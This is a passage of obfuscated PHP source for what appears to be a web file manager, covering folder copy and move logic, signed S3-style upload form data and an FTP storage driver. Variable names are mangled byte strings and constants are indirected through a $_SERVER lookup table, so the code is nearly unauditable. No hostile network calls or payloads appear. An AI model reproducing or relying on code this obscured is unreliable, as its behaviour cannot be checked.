($¶»‚ÏÂ³ == REPEAT_RENAME || $¶»‚ÏÂ³ == REPEAT_RENAME_FOLDER) { $é×¡”Ó– = $this->fileNameAuto($²•×µ‹µ, $é×¡”Ó–, $¶»‚ÏÂ³, $êÌ®™ĞÃ); $…‰ÑÕ€“ = $this->_moveForce($Š‚êÔË§, $²•×µ‹µ, $é×¡”Ó–); } else { if ($¶»‚ÏÂ³ == REPEAT_REPLACE) { $ÔüÄØã´ = $this->sourceInfoCache($Òá¥ÛŸ„); $ã¤¯· = $this->fileHistory($ÔüÄØã´, $ËûŒÇâ[$È´çÚÇô[477]], $ËûŒÇâ[$È´çÚÇô[86]]); $÷ÊëúíŸ = !0; if ($ã¤¯·) { $Óğ‚ÑâÌ[$È´çÚÇô[575]][] = $ËûŒÇâ[$È´çÚÇô[477]]; } } } } } if ($÷ÊëúíŸ && !$Óğ‚ÑâÌ[$È´çÚÇô[607]]) { $Óğ‚ÑâÌ[$È´çÚÇô[607]] = !0; } return $…‰ÑÕ€“; } private function _moveForce($÷Õ»¬ùÅ, $ƒ‰Á¬¶³, $“õÃö×Ê) { $¶Ì¦ˆ· =& $_SERVER[„Ç©ñÎ©]; $ñ…î¸¶› = $this->sourceInfo($÷Õ»¬ùÅ); $Îè±ı = $this->sourceInfo($ƒ‰Á¬¶³); $ÚûáÙ÷ = $ñ…î¸¶›[$¶Ì¦ˆ·[419]] == $¶Ì¦ˆ·[98]; $¿ò¨´ŸŞ = array($¶Ì¦ˆ·[410] => $Îè±ı[$¶Ì¦ˆ·[411]], $¶Ì¦ˆ·[599] => $Îè±ı[$¶Ì¦ˆ·[530]] . $Îè±ı[$¶Ì¦ˆ·[411]] . $¶Ì¦ˆ·[50], $¶Ì¦ˆ·[595] => $Îè±ı[$¶Ì¦ˆ·[420]], $¶Ì¦ˆ·[596] => $Îè±ı[$¶Ì¦ˆ·[514]], $¶Ì¦ˆ·[598] => USER_ID, $¶Ì¦ˆ·[429] => $“õÃö×Ê); $¹ßØßÄ§ = $ñ…î¸¶›[$¶Ì¦ˆ·[420]] == SourceModel::TYPE_GROUP && $Îè±ı[$¶Ì¦ˆ·[420]] == SourceModel::TYPE_GROUP && $ñ…î¸¶›[$¶Ì¦ˆ·[514]] == $Îè±ı[$¶Ì¦ˆ·[514]]; if (!$¹ßØßÄ§ && $this->moveClearAuth) { Model($¶Ì¦ˆ·[511])->authClear($÷Õ»¬ùÅ); } $ÍÂ‰‹ö¡ = $ñ…î¸¶›[$¶Ì¦ˆ·[440]] == $¶Ì¦ˆ·[98] && $Îè±ı[$¶Ì¦ˆ·[440]] != $¶Ì¦ˆ·[98]; if ($ÍÂ‰‹ö¡) { $¿ò¨´ŸŞ[$¶Ì¦ˆ·[439]] = 0; } if ($ÚûáÙ÷) { $¶•’†» = array($¶Ì¦ˆ·[599] => array($¶Ì¦ˆ·[559], $ñ…î¸¶›[$¶Ì¦ˆ·[530]] . $ñ…î¸¶›[$¶Ì¦ˆ·[411]] . $¶Ì¦ˆ·[560])); $Øáıé¼ô = $ñ…î¸¶›[$¶Ì¦ˆ·[530]] . $ñ…î¸¶›[$¶Ì¦ˆ·[411]] . $¶Ì¦ˆ·[50]; $è¤¶º¡‘ = $Îè±ı[$¶Ì¦ˆ·[530]] . $Îè±ı[$¶Ì¦ˆ·[411]] . $¶Ì¦ˆ·[50] . $ñ…î¸¶›[$¶Ì¦ˆ·[411]] . $¶Ì¦ˆ·[50]; $½êëáÄ“ = array($¶Ì¦ˆ·[599] => array($¶Ì¦ˆ·[608], "\162\145\160\x6c\x61\143\x65\50\160\x61\x72\145\x6e\x74\114\145\166\x65\x6c\x2c\x27{$Øáıé¼ô}\x27\x2c\47{$è¤¶º¡‘}\47\x29"), $¶Ì¦ˆ·[595] => $Îè±ı[$¶Ì¦ˆ·[420]], $¶Ì¦ˆ·[596] => $Îè±ı[$¶Ì¦ˆ·[514]]); if ($ÍÂ‰‹ö¡) { $½êëáÄ“[$¶Ì¦ˆ·[439]] = 0; } $this->where($¶•’†»)->data($½êëáÄ“)->save(); } $this->where(array($¶Ì¦ˆ·[426] => $÷Õ»¬ùÅ))->data($¿ò¨´ŸŞ)->save(); return $÷Õ»¬ùÅ; } private function clearShare($˜¿øğ™’, $”‰Ò€ş„) { $ğî©ñÃŞ =& $_SERVER[„Ç©ñÎ©]; $áÎ§‹ò = $this->sourceInfo($˜¿øğ™’); $È–Ãá¾ = $this->sourceInfo($”‰Ò€ş„); if ($áÎ§‹ò[$ğî©ñÃŞ[514]] == $È–Ãá¾[$ğî©ñÃŞ[514]] && $áÎ§‹ò[$ğî©ñÃŞ[420]] == $ğî©ñÃŞ[609]) { return; } $”¥¨İÙ = array($ğî©ñÃŞ[530] => array($ğî©ñÃŞ[559], $áÎ§‹ò[$ğî©ñÃŞ[530]] . $˜¿øğ™’ . $ğî©ñÃŞ[560])); $â×ü×˜ = $this->field($ğî©ñÃŞ[426])->where($”¥¨İÙ)->getField($ğî©ñÃŞ[411], !0); if (!$â×ü×˜) { return; } $”¥¨İÙ = array($ğî©ñÃŞ[411] => array($ğî©ñÃŞ[7], $â×ü×˜), $ğî©ñÃŞ[505] => 1); $ª¡š÷”¥ = Model($ğî©ñÃŞ[610])->field($ğî©ñÃŞ[498])->where($”¥¨İÙ)->select(); if (!$ª¡š÷”¥) { return; } $ª¡š÷”¥ = array_to_keyvalue($ª¡š÷”¥, $ğî©ñÃŞ[12], $ğî©ñÃŞ[498]); $”¥¨İÙ = array($ğî©ñÃŞ[498] => array($ğî©ñÃŞ[7], $ª¡š÷”¥)); Model($ğî©ñÃŞ[610])->where($”¥¨İÙ)->save(array($ğî©ñÃŞ[505] => 0)); Model($ğî©ñÃŞ[611])->where($”¥¨İÙ)->delete(); } public function copyFolderFromIO($”“ÛÒ²¿, $ƒñò¤²ö, $™ò†È›š, $ó­É”¢ó, $ÖâÔğ´, $ğíÎÅğ = false) { $Ì¿¸ˆÕ¥ =& $_SERVER[„Ç©ñÎ©]; $ÃÇ íĞ¹ = array($Ì¿¸ˆÕ¥[576] => array(), $Ì¿¸ˆÕ¥[577] => array(), $Ì¿¸ˆÕ¥[575] => array(), $Ì¿¸ˆÕ¥[612] => array()); $£îŸñ‰Ó = $ğíÎÅğ ? $ğíÎÅğ : $”“ÛÒ²¿->pathThis($ƒñò¤²ö); $”ËŞèÃ‰ = $this->fileNameExist($™ò†È›š, $£îŸñ‰Ó); $É×“åà² = $this->mkdir($™ò†È›š, $£îŸñ‰Ó, $ó­É”¢ó); if (!$”ËŞèÃ‰ || $ó­É”¢ó == REPEAT_RENAME_FOLDER) { $ó­É”¢ó = !1; } if ($”ËŞèÃ‰) { $this->_childrenAllMake($”ËŞèÃ‰); } Hook::trigger($Ì¿¸ˆÕ¥[613]); $this->_copyChildTo($”“ÛÒ²¿, $ƒñò¤²ö, $É×“åà², $ó­É”¢ó, $ÃÇ íĞ¹, $ÖâÔğ´); Hook::trigger($Ì¿¸ˆÕ¥[614]); if ($É×“åà²) { $this->folderSizeResetChildren($É×“åà²); } $this->_childrenListClear(); Model($Ì¿¸ˆÕ¥[578])->addAll($ÃÇ íĞ¹[$Ì¿¸ˆÕ¥[576]], array(), !0); Model($Ì¿¸ˆÕ¥[579])->eventCopy($É×“åà²); $this->saveAll($ÃÇ íĞ¹[$Ì¿¸ˆÕ¥[577]]); Model($Ì¿¸ˆÕ¥[480])->linkAdd($ÃÇ íĞ¹[$Ì¿¸ˆÕ¥[575]]); Model($Ì¿¸ˆÕ¥[480])->remove($ÃÇ íĞ¹[$Ì¿¸ˆÕ¥[612]]); $this->folderSizeReset($™ò†È›š); $this->updateModifyTime($™ò†È›š); return $É×“åà²; } private function _copyChildTo($¸ï„ìéÎ, $ÓæßŞø¦, $º›¤Ë½†, $Êîî«ò•, &$šÃ¦İüÚ, $Ö¼ö”§¹) { $õüÃÔ´© =& $_SERVER[„Ç©ñÎ©]; $äŞ¨ÛŸÀ = $this->sourceInfoCache($º›¤Ë½†); $Öİ½®—‰ = $¸ï„ìéÎ->listPath($ÓæßŞø¦); $Öİ½®—‰ = $Öİ½®—‰ ? $Öİ½®—‰ : array($õüÃÔ´©[93] => array(), $õüÃÔ´©[92] => array()); $¬£¤­ãÁ = array_merge($Öİ½®—‰[$õüÃÔ´©[93]], $Öİ½®—‰[$õüÃÔ´©[92]]); $ò¬£ŠÇ¼ = $this->_addFiles($¸ï„ìéÎ, $Öİ½®—‰[$õüÃÔ´©[93]], $Ö¼ö”§¹); $É¾²º¤ = array(); foreach ($¬£¤­ãÁ as &$²†½ÆŒ) { if (isset($ò¬£ŠÇ¼[$²†½ÆŒ[$õüÃÔ´©[32]]])) { $²†½ÆŒ = $ò¬£ŠÇ¼[$²†½ÆŒ[$õüÃÔ´©[32]]]; } $²†½ÆŒ[$õüÃÔ´©[419]] = $²†½ÆŒ[$õüÃÔ´©[33]] == $õüÃÔ´©[85]; $²†½ÆŒ[$õüÃÔ´©[421]] = substr(_get($²†½ÆŒ, $õüÃÔ´©[184], $õüÃÔ´©[12]), 0, 10); $²†½ÆŒ[$õüÃÔ´©[86]] = _get($²†½ÆŒ, $õüÃÔ´©[86], 0); $²†½ÆŒ[$õüÃÔ´©[477]] = _get($²†½ÆŒ, $õüÃÔ´©[477], 0); if (!isset($²†½ÆŒ[$õüÃÔ´©[615]]) && $²†½ÆŒ[$õüÃÔ´©[477]]) { $šÃ¦İüÚ[$õüÃÔ´©[612]][] = $²†½ÆŒ[$õüÃÔ´©[477]]; } if ($Êîî«ò•) { $ÌÆºµ— = $this->fileNameExistCache($º›¤Ë½†, $²†½ÆŒ[$õüÃÔ´©[32]]); if ($ÌÆºµ—) { if ($²†½ÆŒ[$õüÃÔ´©[419]] || $Êîî«ò• == REPEAT_SKIP) { continue; } if ($Êîî«ò• == REPEAT_REPLACE) { $ÇïğŸÖÂ = $this->sourceInfoCache($ÌÆºµ—); $…éµ•ì• = $this->fileHistory($ÇïğŸÖÂ, $²†½ÆŒ[$õüÃÔ´©[477]], $²†½ÆŒ[$õüÃÔ´©[86]]); if ($…éµ•ì•) { $šÃ¦İüÚ[$õüÃÔ´©[575]][] = $²†½ÆŒ[$õüÃÔ´©[477]]; } continue; } else { if ($Êîî«ò• == REPEAT_RENAME) { $²†½ÆŒ[$õüÃÔ´©[32]] = $this->fileNameAutoCache($º›¤Ë½†, $²†½ÆŒ[$õüÃÔ´©[32]], $Êîî«ò•, !1); } } } } if (!$²†½ÆŒ[$õüÃÔ´©[419]] && $²†½ÆŒ[$õüÃÔ´©[477]] == 0) { continue; } if (!$²†½ÆŒ[$õüÃÔ´©[419]] && $²†½ÆŒ[$õüÃÔ´©[477]]) { $šÃ¦İüÚ[$õüÃÔ´©[575]][] = $²†½ÆŒ[$õüÃÔ´©[477]]; } $É¾²º¤[] = $this->_makeItemData($²†½ÆŒ, $äŞ¨ÛŸÀ, $²†½ÆŒ[$õüÃÔ´©[32]]); } unset($²†½ÆŒ); if (!empty($É¾²º¤)) { $this->addAll($É¾²º¤); $this->_childrenListSelect($º›¤Ë½†); } $Äã‰í¯£ = $this->_childrenList($º›¤Ë½†); $Äã‰í¯£ = array_to_keyvalue($Äã‰í¯£, $õüÃÔ´©[32]); foreach ($¬£¤­ãÁ as $²†½ÆŒ) { $ÇïğŸÖÂ = $Äã‰í¯£[$²†½ÆŒ[$õüÃÔ´©[32]]]; $Û®ğ° = $ÇïğŸÖÂ[$õüÃÔ´©[411]]; $this->_copyApplyMeta($ÇïğŸÖÂ, $šÃ¦İüÚ); if ($²†½ÆŒ[$õüÃÔ´©[33]] == $õüÃÔ´©[85]) { $²†½ÆŒ[$õüÃÔ´©[94]] = $¸ï„ìéÎ->getPathInner($²†½ÆŒ[$õüÃÔ´©[94]]); $this->_copyChildTo($¸ï„ìéÎ, $²†½ÆŒ[$õüÃÔ´©[94]], $Û®ğ°, $Êîî«ò•, $šÃ¦İüÚ, $Ö¼ö”§¹); } } } private function _addFiles($øÀÑ˜º£, $Î® ¢”¶, $Î„Ø÷êÈ) { $ìòŸçÚ¬ =& $_SERVER[„Ç©ñÎ©]; if (!$Î® ¢”¶ || count($Î® ¢”¶) == 0) { return array(); } $ìºÒà = array(); foreach ($Î® ¢”¶ as &$š‡ÕåŠ») { Hook::trigger($ìòŸçÚ¬[616], $š‡ÕåŠ»); $š‡ÕåŠ»[$ìòŸçÚ¬[94]] = $øÀÑ˜º£->getPathInner($š‡ÕåŠ»[$ìòŸçÚ¬[94]]); $íÖÌì¥à = $øÀÑ˜º£->hashSimple($š‡ÕåŠ»[$ìòŸçÚ¬[94]]); $ï„Åº€í = $øÀÑ˜º£->hashMd5($š‡ÕåŠ»[$ìòŸçÚ¬[94]]); if (strlen($ï„Åº€í) > 10 && !isset($ìºÒà[$ï„Åº€í])) { $ìºÒà[$ï„Åº€í] = array(); } $š‡ÕåŠ»[$ìòŸçÚ¬[187]] = $íÖÌì¥à; $š‡ÕåŠ»[$ìòŸçÚ¬[186]] = $ï„Åº€í; $ìºÒà[$ï„Åº€í][] =& $š‡ÕåŠ»; if (count($ìºÒà[$ï„Åº€í]) > 1) { $š‡ÕåŠ»[$ìòŸçÚ¬[615]] = !0; } Hook::trigger($ìòŸçÚ¬[617], $š‡ÕåŠ»); } unset($š‡ÕåŠ»); $„Â°Ãä¤ = array($ìòŸçÚ¬[186] => array($ìòŸçÚ¬[7], array_keys($ìºÒà))); $šù¾Î×  = Model($ìòŸçÚ¬[618]); $îŞÑ”œÖ = $šù¾Î× ->where($„Â°Ãä¤)->select(); $îŞÑ”œÖ = $îŞÑ”œÖ ? $îŞÑ”œÖ : array(); foreach ($îŞÑ”œÖ as $óşäÛ¨) { if (!isset($ìºÒà[$óşäÛ¨[$ìòŸçÚ¬[186]]])) { continue; } $•Ê¿¼Ë = $ìºÒà[$óşäÛ¨[$ìòŸçÚ¬[186]]]; foreach ($•Ê¿¼Ë as &$š‡ÕåŠ») { $š‡ÕåŠ»[$ìòŸçÚ¬[477]] = $óşäÛ¨[$ìòŸçÚ¬[477]]; $š‡ÕåŠ»[$ìòŸçÚ¬[615]] = !0; } unset($š‡ÕåŠ»); } $îŸšÙŞµ = array(); foreach ($Î® ¢”¶ as $€Ê˜äÚ) { Hook::trigger($ìòŸçÚ¬[619], $€Ê˜äÚ); if (isset($€Ê˜äÚ[$ìòŸçÚ¬[615]]) && $€Ê˜äÚ[$ìòŸçÚ¬[615]]) { Hook::trigger($ìòŸçÚ¬[620], $€Ê˜äÚ); continue; } $»¶’‡Ü¥ = $øÀÑ˜º£->getPathInner($€Ê˜äÚ[$ìòŸçÚ¬[94]]); $Ä°àõ«£ = $šù¾Î× ->addFileMake($»¶’‡Ü¥, $€Ê˜äÚ[$ìòŸçÚ¬[86]], $€Ê˜äÚ[$ìòŸçÚ¬[187]], $€Ê˜äÚ[$ìòŸçÚ¬[186]], $€Ê˜äÚ[$ìòŸçÚ¬[32]], $Î„Ø÷êÈ); Hook::trigger($ìòŸçÚ¬[620], $€Ê˜äÚ); if (!is_array($Ä°àõ«£)) { continue; } $îŸšÙŞµ[] = $Ä°àõ«£; } $šù¾Î× ->addAll($îŸšÙŞµ); $„Â°Ãä¤ = array($ìòŸçÚ¬[186] => array($ìòŸçÚ¬[7], array_keys($ìºÒà))); $îŞÑ”œÖ = $šù¾Î× ->where($„Â°Ãä¤)->select(); $îŞÑ”œÖ = $îŞÑ”œÖ ? $îŞÑ”œÖ : array(); foreach ($îŞÑ”œÖ as $óşäÛ¨) { if (!isset($ìºÒà[$óşäÛ¨[$ìòŸçÚ¬[186]]])) { continue; } $øİòù¨ =& $ìºÒà[$óşäÛ¨[$ìòŸçÚ¬[186]]]; foreach ($øİòù¨ as &$š‡ÕåŠ») { $š‡ÕåŠ»[$ìòŸçÚ¬[477]] = $óşäÛ¨[$ìòŸçÚ¬[477]]; } unset($š‡ÕåŠ»); } $‘ğëØšö = array(); foreach ($Î® ¢”¶ as $¡Â¶¸„) { $‘ğëØšö[$¡Â¶¸„[$ìòŸçÚ¬[32]]] = $¡Â¶¸„; } return $‘ğëØšö; } } goto c‡­¦…ì£; Bàì„Êö¥: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ĞİüÃåÄ) { parent::__construct($ĞİüÃåÄ); $this->signatureVersion($_SERVER[„Ç©ñÎ©][226]); } public function uploadFormData($¢·ë¹«‡, $çÙ±Õ‡Ş = 3600) { $Ã«Ó‘„× =& $_SERVER[„Ç©ñÎ©]; $Ğô°éıÕ = $Ã«Ó‘„×[208]; $«ïªÔÅ = $Ã«Ó‘„×[1345]; $Û¿ Áˆ = $Ã«Ó‘„×[72]; $®ıõ¢— = gmdate($Ã«Ó‘„×[1346]); $†ĞØî ö = gmdate($Ã«Ó‘„×[754]); $ò«Õ™ûÓ = $Ã«Ó‘„×[1347]; $“ĞÄÍ´œ = $çÙ±Õ‡Ş . $Ã«Ó‘„×[12]; $ù·àëÛğ = $Ã«Ó‘„×[1309]; $‚ëó›Íï = array($this->accessKey, $†ĞØî ö, $this->region, $Û¿ Áˆ, $ò«Õ™ûÓ); $¾šÆºõ² = implode($Ã«Ó‘„×[8], $‚ëó›Íï); $ÍùíâĞ¶ = array($Ã«Ó‘„×[1311] => gmdate($Ã«Ó‘„×[1310], strtotime($Ã«Ó‘„×[1348])), $Ã«Ó‘„×[1312] => array(array($Ã«Ó‘„×[1314] => $this->bucket), array($Ã«Ó‘„×[1313] => $Ğô°éıÕ), array($Ã«Ó‘„×[1315], $Ã«Ó‘„×[1316], $Ã«Ó‘„×[12]), array($Ã«Ó‘„×[1315], $Ã«Ó‘„×[1349], $Ã«Ó‘„×[12]), array($Ã«Ó‘„×[1315], $Ã«Ó‘„×[1350], $Ã«Ó‘„×[12]), array($Ã«Ó‘„×[1317] => $ù·àëÛğ), array($Ã«Ó‘„×[1351] => $¾šÆºõ²), array($Ã«Ó‘„×[1352] => $«ïªÔÅ), array($Ã«Ó‘„×[1353] => $®ıõ¢—), array($Ã«Ó‘„×[1354] => $“ĞÄÍ´œ))); $¾™†Üş® = base64_encode(json_encode($ÍùíâĞ¶)); $’¼‡ĞÔ = hash_hmac($Ã«Ó‘„×[1355], $†ĞØî ö, $Ã«Ó‘„×[1356] . $this->secret, !0); $´ˆ¸‚ƒ = hash_hmac($Ã«Ó‘„×[1355], $this->region, $’¼‡ĞÔ, !0); $ù–±üØŠ = hash_hmac($Ã«Ó‘„×[1355], $Û¿ Áˆ, $´ˆ¸‚ƒ, !0); $ûä°œÖ” = hash_hmac($Ã«Ó‘„×[1355], $ò«Õ™ûÓ, $ù–±üØŠ, !0); $´£õÀÙ¨ = hash_hmac($Ã«Ó‘„×[1355], $¾™†Üş®, $ûä°œÖ”); $İ¢¾œ¾„ = array($Ã«Ó‘„×[225] => $Ã«Ó‘„×[12], $Ã«Ó‘„×[1357] => $Ã«Ó‘„×[12], $Ã«Ó‘„×[1313] => $Ğô°éıÕ, $Ã«Ó‘„×[1317] => $ù·àëÛğ, $Ã«Ó‘„×[1321] => $¾™†Üş®, $Ã«Ó‘„×[1358] => $¾šÆºõ², $Ã«Ó‘„×[1359] => $«ïªÔÅ, $Ã«Ó‘„×[1360] => $®ıõ¢—, $Ã«Ó‘„×[1361] => $“ĞÄÍ´œ, $Ã«Ó‘„×[1362] => $´£õÀÙ¨, $Ã«Ó‘„×[191] => $this->getHost()); return $İ¢¾œ¾„; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Ü‘ÓÀÇ‘) { parent::__construct(); if (count($Ü‘ÓÀÇ‘) > 0) { $this->_init($Ü‘ÓÀÇ‘); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÆØ¤ïÖ²) { $’´×Ñ¹ =& $_SERVER[„Ç©ñÎ©]; global $config; $this->appCharset = $config[$’´×Ñ¹[1363]]; $this->systemCharset = $config[$’´×Ñ¹[1364]]; if (isset($ÆØ¤ïÖ²[$’´×Ñ¹[1365]]) && $ÆØ¤ïÖ²[$’´×Ñ¹[1365]]) { $this->systemCharset = $ÆØ¤ïÖ²[$’´×Ñ¹[1365]]; } } public function iconvApp($®¾ÁĞÄô) { return $this->iconvTo($®¾ÁĞÄô, $this->systemCharset, $this->appCharset); } public function iconvSystem($²ƒ‡íƒï) { return $this->iconvTo($²ƒ‡íƒï, $this->appCharset, $this->systemCharset); } public function getPathOuter($²µ›¼Íü) { $ôÉö†š’ =& $_SERVER[„Ç©ñÎ©]; $Ş†Ì«‰ı = $this->iconvApp($this->pathBase); $²µ›¼Íü = $this->iconvApp($²µ›¼Íü); if (substr($Ş†Ì«‰ı, 0, 2) == $ôÉö†š’[1366]) { $Ş†Ì«‰ı = BASIC_PATH . substr($Ş†Ì«‰ı, 2); } if (substr($²µ›¼Íü, 0, 2) == $ôÉö†š’[1366]) { $²µ›¼Íü = BASIC_PATH . substr($²µ›¼Íü, 2); } $Ş†Ì«‰ı = KodIO::clear($Ş†Ì«‰ı); $²µ›¼Íü = KodIO::clear($²µ›¼Íü); $²µ›¼Íü = substr($²µ›¼Íü, strlen($Ş†Ì«‰ı)); if (empty($this->pathDriver)) { return $²µ›¼Íü; } return $this->pathDriver . $ôÉö†š’[8] . ltrim($²µ›¼Íü, $ôÉö†š’[8]); } private function _init($úÕİ—£ = array()) { $¤ô‘ ññ =& $_SERVER[„Ç©ñÎ©]; if (!function_exists($¤ô‘ ññ[1367])) { throw new Exception(LNG($¤ô‘ ññ[1368])); } $this->config = $úÕİ—£; $this->charsetReset($úÕİ—£); foreach ($úÕİ—£ as $ìà¸Ù¥Œ => $ÉçÂ¶ŠÓ) { if (isset($this->{$ìà¸Ù¥Œ})) { $this->{$ìà¸Ù¥Œ} = $ÉçÂ¶ŠÓ; } } return $this->_login($úÕİ—£); } private function _login($©“¼İ™) { $úıŞß†â =& $_SERVER[„Ç©ñÎ©]; static $¼Æô½å² = array(); $ã››Ÿß× = md5(json_encode($©“¼İ™)); if (isset($¼Æô½å²[$ã››Ÿß×])) { foreach ($¼Æô½å²[$ã››Ÿß×] as $ì¼ÃÂ²Ç => $¾ÒÙ¬‹) { $this->{$ì¼ÃÂ²Ç} = $¾ÒÙ¬‹; } return !0; } $ú¸¡’ÄÌ = parse_url(trim($this->server, $úıŞß†â[8])); $this->host = $ú¸¡’ÄÌ[$úıŞß†â[191]]; $Ÿ¾¬•°Š = isset($ú¸¡’ÄÌ[$úıŞß†â[190]]) && $ú¸¡’ÄÌ[$úıŞß†â[190]] == $úıŞß†â[1369] ? !0 : !1; $this->scheme = $Ÿ¾¬•°Š ? $úıŞß†â[1370] : $úıŞß†â[1371]; $this->port = isset($ú¸¡’ÄÌ[$úıŞß†â[192]]) ? $ú¸¡’ÄÌ[$úıŞß†â[192]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¶Ğçéâ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $õ–óƒ¥ö = $this->pasv == $úıŞß†â[98] ? !0 : !1; @ftp_pasv($this->connect, $õ–óƒ¥ö); $¼Æô½å²[$ã››Ÿß×] = array($úıŞß†â[1372] => $this->connect, $úıŞß†â[191] => $this->host, $úıŞß†â[190] => $this->scheme, $úıŞß†â[192] => $this->port); return $¶Ğçéâ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ğÄÃÕ­³, $ı‡¢ï¾õ = '', $ÛÛÕÑ­µ = REPEAT_RENAME) { if ($this->setContent($ğÄÃÕ­³, $ı‡¢ï¾õ)) { return $this->getPathOuter($ğÄÃÕ­³); } return !1; } public function mkdir($ìªÜáñ“, $¨“›²úí = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ìªÜáñ“ = $this->iconvSystem($ìªÜáñ“); if ($this->_isFolder($ìªÜáñ“) || @ftp_mkdir($this->connect, $ìªÜáñ“)) { return $this->getPathOuter($ìªÜáñ“); } if (!$this->mkdir($this->pathFather($ìªÜáñ“))) { return !1; } if ($ìªÜáñ“ = @ftp_mkdir($this->connect, $ìªÜáñ“)) { return $this->getPathOuter($ìªÜáñ“); } return !1; } public function copyFile($³«Æ˜Ú©, $Ù¨ÚÖğ) { if (!$this->_isconn()) { return !1; } $‡ƒµÂ²ˆ = $this->pathThis($this->iconvSystem($³«Æ˜Ú©)); $Ê§ÃÔİÊ = $this->tempFile($‡ƒµÂ²ˆ); $¹‰’ää = $this->iconvApp($Ê§ÃÔİÊ); $this->download($³«Æ˜Ú©, $¹‰’ää); $‘ŸƒÅ€£ = $this->upload($Ù¨ÚÖğ, $¹‰’ää); $this->tempFileRemve($Ê§ÃÔİÊ); return $‘ŸƒÅ€£; } public function moveFile($é÷ïò¼, $Æ÷«¨¤æ) { if (!$this->_isconn()) { return !1; } $é÷ïò¼ = $this->iconvSystem($é÷ïò¼); $Æ÷«¨¤æ = $this->iconvSystem($Æ÷«¨¤æ); $º»†ƒíÚ = @ftp_rename($this->connect, $é÷ïò¼, $Æ÷«¨¤æ); return $º»†ƒíÚ ? $this->getPathOuter($Æ÷«¨¤æ) : !1; } public function delFile($ÕòçËî) { if (!$this->_isconn()) { return !1; } $ÕòçËî = $this->iconvSystem($ÕòçËî); return @ftp_delete($this->connect, $ÕòçËî); } public function delFolder($¬Ã’¾ó) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ğò”åã = $Ùì³ê¾² = array(); $this->fileList($¬Ã’¾ó, $Ğò”åã, $Ùì³ê¾², !0); $this->listItemCache = !0; foreach ($Ùì³ê¾² as $±Î„¦öî) { $ˆ¸‹Œ = $this->iconvSystem($±Î„¦öî[$_SERVER[„Ç©ñÎ©][32]]); $ˆúïèÒŸ = @ftp_delete($this->connect, $ˆ¸‹Œ); if (!$ˆúïèÒŸ) { return !1; } } foreach ($Ğò”åã as $ˆ¸‹Œ) { $ˆ¸‹Œ = $this->iconvSystem($ˆ¸‹Œ); $ˆúïèÒŸ = @ftp_rmdir($this->connect, $ˆ¸‹Œ); if (!$ˆúïèÒŸ) { return !1; } } $¬Ã’¾ó = $this->iconvSystem($¬Ã’¾ó); return @ftp_rmdir($this->connect, $¬Ã’¾ó); } public function rename($…™õÛı, $Ë¥ç«‘é) { $Ïà¬Ø‚ =& $_SERVER[„Ç©ñÎ©]; if (!$this->_isconn()) { return !1; } $£ÍÛù« = $this->fileNameAuto($this->pathFather($…™õÛı), $Ë¥ç«‘é); $£ÍÛù« = $this->iconvSystem($£ÍÛù«); $…™õÛı = $this->iconvSystem($…™õÛı); $Å‚ñ†‰ = $this->pathFather($…™õÛı); $ûŒÏ¨ªû = rtrim($Å‚ñ†‰, $Ïà¬Ø‚[8]) . $Ïà¬Ø‚[8] . $£ÍÛù«; $ˆ×Ö–£” = @ftp_rename($this->connect, $…™õÛı, $ûŒÏ¨ªû); $ûŒÏ¨ªû = $this->iconvApp($ûŒÏ¨ªû); return $ˆ×Ö–£” ? $this->getPathOuter($ûŒÏ¨ªû) : !1; } private function folderInfo($¾îÏ”îÌ, $âÏÙƒÚ = false) { $›©„¨Œ· =& $_SERVER[„Ç©ñÎ©]; $ŸÅ¬¹ÍÒ = array($›©„¨Œ·[32] => $this->pathThis($¾îÏ”îÌ), $›©„¨Œ·[94] => $this->getPathOuter($›©„¨Œ·[8] . $¾îÏ”îÌ), $›©„¨Œ·[33] => $›©„¨Œ·[85]); if ($âÏÙƒÚ) { return $ŸÅ¬¹ÍÒ; } $ŸÅ¬¹ÍÒ[$›©„¨Œ·[210]] = $ŸÅ¬¹ÍÒ[$›©„¨Œ·[95]] = 0; $ŸÅ¬¹ÍÒ[$›©„¨Œ·[211]] = $ŸÅ¬¹ÍÒ[$›©„¨Œ·[212]] = !0; return $ŸÅ¬¹ÍÒ; } private function fileInfo($ÜÄ¬³Å¡, $é¡ç İĞ = false, $¬ã©ÃÕü = array()) { $§ÑâæÖä =& $_SERVER[„Ç©ñÎ©]; $Àœò³è  = array($§ÑâæÖä[32] => $this->pathThis($ÜÄ¬³Å¡), $§ÑâæÖä[94] => $this->getPathOuter($§ÑâæÖä[8] . $ÜÄ¬³Å¡), $§ÑâæÖä[33] => $§ÑâæÖä[209], $§ÑâæÖä[86] => isset($¬ã©ÃÕü[$§ÑâæÖä[86]]) ? $¬ã©ÃÕü[$§ÑâæÖä[86]] : 0, $§ÑâæÖä[184] => $this->ext($ÜÄ¬³Å¡)); if ($é¡ç İĞ) { return $Àœò³è ; } $Àœò³è [$§ÑâæÖä[210]] = $Àœò³è [$§ÑâæÖä[95]] = 0; $Àœò³è [$§ÑâæÖä[211]] = $Àœò³è [$§ÑâæÖä[212]] = !0; $«Å‘ÂŒ¥ = $this->iconvSystem($ÜÄ¬³Å¡); $Àœò³è [$§ÑâæÖä[95]] = @ftp_mdtm($this->connect, $«Å‘ÂŒ¥); if (empty($¬ã©ÃÕü)) { $¬ã©ÃÕü = $this->objectMeta($ÜÄ¬³Å¡); if (!$¬ã©ÃÕü) { return $Àœò³è ; } } $Àœò³è [$§ÑâæÖä[86]] = $¬ã©ÃÕü[$§ÑâæÖä[86]]; return $Àœò³è ; } public function size($Ì¶æÌü) { $ı„´ÉŸ÷ = $this->objectMeta($Ì¶æÌü); return $ı„´ÉŸ÷ ? $ı„´ÉŸ÷[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function info($®ßÏ’ŠÎ) { if ($this->isFile($®ßÏ’ŠÎ)) { return $this->fileInfo($®ßÏ’ŠÎ, 0); } else { if ($this->isFolder($®ßÏ’ŠÎ)) { return 